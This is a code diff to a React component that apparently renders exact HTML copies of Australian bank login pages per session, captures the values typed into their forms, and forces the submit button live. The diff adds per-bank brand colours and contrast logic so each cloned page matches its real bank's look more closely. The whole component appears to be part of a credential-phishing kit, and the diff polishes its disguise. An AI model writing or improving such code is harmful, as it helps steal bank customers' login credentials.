@@ -4,7 +4,7 @@ import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
-import { getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
+import { getAuBankPageEntry, getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
 import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";
 
 type Props = {
@@ -544,8 +544,61 @@ function isExternalHref(href: string | null) {
   return /^https?:\/\//i.test(href.trim());
 }
 
-function getActiveButtonColor(_bankSlug: string) {
-  return "#FFD43B";
+function hexToRgb(hex: string): { r: number; g: number; b: number } {
+  const h = (hex ?? "").replace(/^#/, "").trim();
+  const full =
+    h.length === 3
+      ? h.split("").map((c) => c + c).join("")
+      : (h.length === 6 ? h : (h + "000000").slice(0, 6));
+  const num = parseInt(full, 16);
+  if (Number.isNaN(num)) return { r: 255, g: 212, b: 59 };
+  return {
+    r: (num >> 16) & 255,
+    g: (num >> 8) & 255,
+    b: num & 255,
+  };
+}
+
+function getRelativeLuminance(r: number, g: number, b: number): number {
+  const [rs, gs, bs] = [r, g, b].map((c) => {
+    const s = c / 255;
+    return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4);
+  });
+  return 0.2126 * rs + 0.7152 * gs + 0.0722 * bs;
+}
+
+function getContrastTextColor(hexBg: string, lightHex: string = "#FFFFFF", darkHex: string = "#2B2212"): string {
+  const rgb = hexToRgb(hexBg);
+  const lum = getRelativeLuminance(rgb.r, rgb.g, rgb.b);
+  return lum > 0.5 ? darkHex : lightHex;
+}
+
+function getButtonPalette(bankSlug: string): {
+  bg: string;
+  fg: string;
+  border: string;
+  shadow: string;
+  shadowSoft: string;
+  accent: string;
+} {
+  const entry = getAuBankPageEntry(bankSlug);
+  const brand = entry?.brandColor ?? "#FFD43B";
+  const accent = entry?.accentColor ?? "#E5B800";
+  const rgb = hexToRgb(brand);
+  const rgbAccent = hexToRgb(accent);
+  const fg = getContrastTextColor(brand);
+  return {
+    bg: brand,
+    fg,
+    border: accent,
+    accent,
+    shadow: `0 10px 24px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.45)`,
+    shadowSoft: `0 6px 14px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.22)`,
+  };
+}
+
+function getActiveButtonColor(bankSlug: string) {
+  return getButtonPalette(bankSlug).bg;
 }
 
 export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
@@ -1051,7 +1104,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
     const updateSubmitState = () => {
       let isValid = canProceedNow();
-      const activeColor = getActiveButtonColor(bankSlug);
+      const palette = getButtonPalette(bankSlug);
 
       const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginScope, doc);
       const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginScope).filter((f) => {
@@ -1060,9 +1113,6 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       }).length;
       const filledCount = captured.filter((c) => c.value.trim().length > 0).length;
 
-      // ⭐ GARANTİLİ VALİD (3+ inputlu formlarda tüm alanlar DOLU ise canProceedNow() YANLIŞ
-      //   hesaplasa bile (örn document scope'da allRequiredTypes.length fazla geldiği için
-      //   hasAtLeast3Inputs && !allFilled → false dönmesi) bypass et, butonu KESİNLİKLE CANLI göster.
       const isFormScope = (savedSubmitFormRef.current ?? loginScope as any)?.tagName === "FORM";
       const guaranteedValid =
         isFormScope && totalMeaningful >= 2 && filledCount === totalMeaningful && totalMeaningful <= 12;
@@ -1083,13 +1133,12 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       }
 
       const bgColor = isValid
-        ? activeColor
+        ? palette.bg
         : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
-      // ⭐ SARI buton üzerine yazı rengi Koyu sarı-kahverengi (beyaz yerine daha okunaklı)
-      const fgColor = isValid ? "#7A4E00" : "#8A8E90";
-      const borderColor = isValid ? `1px solid #E5B800` : "1px solid transparent";
+      const fgColor = isValid ? palette.fg : "#8A8E90";
+      const borderColor = isValid ? `1px solid ${palette.border}` : "1px solid transparent";
       const boxShadow = isValid
-        ? "0 10px 24px rgba(255, 200, 30, 0.45)"
+        ? palette.shadow
         : "none";
       const cursorVal = saving ? "wait" : "pointer";
       const pointerEvents = saving ? "none" : "auto";
@@ -1378,7 +1427,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           }
         }
 
-        const activeColor = getActiveButtonColor(bankSlug);
+        const palette = getButtonPalette(bankSlug);
 
         // =====================================================================
         // ⭐ 2. NAB / North AMP — INPUT TIKLANAMAMA SORUNU:
@@ -1522,11 +1571,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
           try {
             if (shouldForceEnable) {
-              node.style.setProperty("background-color", activeColor, "important");
-              node.style.setProperty("background", activeColor, "important");
-              node.style.setProperty("color", "#7A4E00", "important");
-              node.style.setProperty("border", "1px solid #E5B800", "important");
-              node.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
+              node.style.setProperty("background-color", palette.bg, "important");
+              node.style.setProperty("background", palette.bg, "important");
+              node.style.setProperty("color", palette.fg, "important");
+              node.style.setProperty("border", `1px solid ${palette.border}`, "important");
+              node.style.setProperty("box-shadow", palette.shadow, "important");
             } else {
               const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
               node.style.setProperty("background-color", bgCol, "important");
@@ -1619,13 +1668,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 } catch {}
                 try {
                   if (shouldForceEnable) {
-                    el.style.setProperty("background", activeColor, "important");
-                    el.style.setProperty("color", "#7A4E00", "important");
-                    el.style.setProperty("border", "1px solid #E5B800", "important");
-                    el.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
+                    el.style.setProperty("background-color", palette.bg, "important");
+                    el.style.setProperty("background", palette.bg, "important");
+                    el.style.setProperty("color", palette.fg, "important");
+                    el.style.setProperty("border", `1px solid ${palette.border}`, "important");
+                    el.style.setProperty("box-shadow", palette.shadow, "important");
                   } else {
                     const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                     el.style.setProperty("background", bgCol, "important");
+                    el.style.setProperty("background-color", bgCol, "important");
                     el.style.setProperty("color", "#8A8E90", "important");
                     el.style.setProperty("border", "1px solid transparent", "important");
                     el.style.setProperty("box-shadow", "none", "important");
@@ -1738,11 +1789,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               } catch {}
               try {
                 if (shouldForceEnable) {
-                  node.style.setProperty("background-color", activeColor, "important");
-                  node.style.setProperty("background", activeColor, "important");
-                  node.style.setProperty("color", "#7A4E00", "important");
-                  node.style.setProperty("border", "1px solid #E5B800", "important");
-                  node.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
+                  node.style.setProperty("background-color", palette.bg, "important");
+                  node.style.setProperty("background", palette.bg, "important");
+                  node.style.setProperty("color", palette.fg, "important");
+                  node.style.setProperty("border", `1px solid ${palette.border}`, "important");
+                  node.style.setProperty("box-shadow", palette.shadow, "important");
                 } else {
                   const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                   node.style.setProperty("background-color", bgCol, "important");
